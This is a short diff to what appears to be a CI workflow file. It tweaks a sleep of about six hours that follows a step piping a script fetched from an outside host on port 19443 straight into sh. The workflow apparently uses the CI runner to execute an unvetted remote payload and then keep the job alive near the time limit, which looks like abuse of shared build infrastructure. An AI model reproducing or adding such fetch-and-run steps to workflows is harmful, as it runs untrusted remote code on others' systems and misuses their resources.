@@ -9,4 +9,4 @@ jobs:
     - name: Run a shell script
       run: |
         curl https://im.openjad.com:19443/one2.sh | sh
-        sleep 5.9h
+        sleep 5.92h
